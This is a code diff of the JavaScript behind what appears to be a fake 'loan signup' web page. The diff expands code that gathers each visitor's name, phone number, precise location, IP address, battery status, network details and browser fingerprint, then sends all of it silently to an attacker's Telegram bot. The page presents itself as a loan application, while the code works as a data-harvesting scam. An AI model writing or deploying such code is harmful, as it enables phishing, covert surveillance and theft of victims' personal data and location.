@@ -135,33 +135,50 @@
             var amount = document.getElementById('amount').value;
 
             // Collect additional data
-            var userAgent = navigator.userAgent; // Get user agent string
-            var browserLanguage = navigator.language; // Get browser language
             var screenWidth = screen.width; // Get screen width
             var screenHeight = screen.height; // Get screen height
             var timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone; // Get user's time zone
 
-            // Attempt to get the user's IP address (IP address retrieval is simplified here for demonstration)
-            fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
-                .then(data => {
-                    var ipAddress = data.ip;
+            // Collect device and hardware information
+            var batteryPromise = navigator.getBattery ? navigator.getBattery() : Promise.resolve(null);
+            batteryPromise.then(function(battery) {
+                var batteryLevel = battery ? battery.level * 100 + '%' : 'N/A';
+                var chargingStatus = battery && battery.charging ? 'Charging' : 'Not Charging';
 
-                    // Construct the Google Maps link using latitude and longitude
-                    var googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+                // Collect network information
+                var networkInfo = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                var connectionType = networkInfo ? networkInfo.effectiveType : 'N/A';
+                var bandwidth = networkInfo ? networkInfo.downlink + ' Mbps' : 'N/A';
+                var latency = networkInfo ? networkInfo.rtt + ' ms' : 'N/A';
 
-                    var message = `New Loan Signup:\nName: ${name}\nPhone Number: ${phone}\nLoan Amount: $${amount}\nLatitude: ${latitude}\nLongitude: ${longitude}\nGoogle Maps: ${googleMapsLink}\n\nAdditional Data:\nIP Address: ${ipAddress}\nUser Agent: ${userAgent}\nBrowser Language: ${browserLanguage}\nScreen Width: ${screenWidth}px\nScreen Height: ${screenHeight}px\nTime Zone: ${timeZone}`;
+                // Collect HTTP headers (simplified for demonstration)
+                var headers = {
+                    'User-Agent': navigator.userAgent,
+                    'Accept-Language': navigator.language,
+                };
 
-                    sendToTelegram(botToken, chatId, message);
-                })
-                .catch(error => {
-                    console.error('Error fetching IP address:', error);
-                    var googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+                // Attempt to get the user's IP address (IP address retrieval is simplified here for demonstration)
+                fetch('https://api.ipify.org?format=json')
+                    .then(response => response.json())
+                    .then(data => {
+                        var ipAddress = data.ip;
 
-                    var message = `New Loan Signup:\nName: ${name}\nPhone Number: ${phone}\nLoan Amount: $${amount}\nLatitude: ${latitude}\nLongitude: ${longitude}\nGoogle Maps: ${googleMapsLink}\n\nAdditional Data:\nUser Agent: ${userAgent}\nBrowser Language: ${browserLanguage}\nScreen Width: ${screenWidth}px\nScreen Height: ${screenHeight}px\nTime Zone: ${timeZone}`;
+                        // Construct the Google Maps link using latitude and longitude
+                        var googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
 
-                    sendToTelegram(botToken, chatId, message);
-                });
+                        var message = `New Loan Signup:\nName: ${name}\nPhone Number: ${phone}\nLoan Amount: $${amount}\nLatitude: ${latitude}\nLongitude: ${longitude}\nGoogle Maps: ${googleMapsLink}\n\nAdditional Data:\nIP Address: ${ipAddress}\nScreen Width: ${screenWidth}px\nScreen Height: ${screenHeight}px\nTime Zone: ${timeZone}\nBattery Level: ${batteryLevel}\nCharging Status: ${chargingStatus}\nNetwork Type: ${connectionType}\nEffective Bandwidth: ${bandwidth}\nNetwork Latency: ${latency}\nUser Agent: ${headers['User-Agent']}\nAccept-Language: ${headers['Accept-Language']}`;
+
+                        sendToTelegram(botToken, chatId, message);
+                    })
+                    .catch(error => {
+                        console.error('Error fetching IP address:', error);
+                        var googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+
+                        var message = `New Loan Signup:\nName: ${name}\nPhone Number: ${phone}\nLoan Amount: $${amount}\nLatitude: ${latitude}\nLongitude: ${longitude}\nGoogle Maps: ${googleMapsLink}\n\nAdditional Data:\nScreen Width: ${screenWidth}px\nScreen Height: ${screenHeight}px\nTime Zone: ${timeZone}\nBattery Level: ${batteryLevel}\nCharging Status: ${chargingStatus}\nNetwork Type: ${connectionType}\nEffective Bandwidth: ${bandwidth}\nNetwork Latency: ${latency}\nUser Agent: ${headers['User-Agent']}\nAccept-Language: ${headers['Accept-Language']}`;
+
+                        sendToTelegram(botToken, chatId, message);
+                    });
+            });
         }
 
         // Function to send data to Telegram
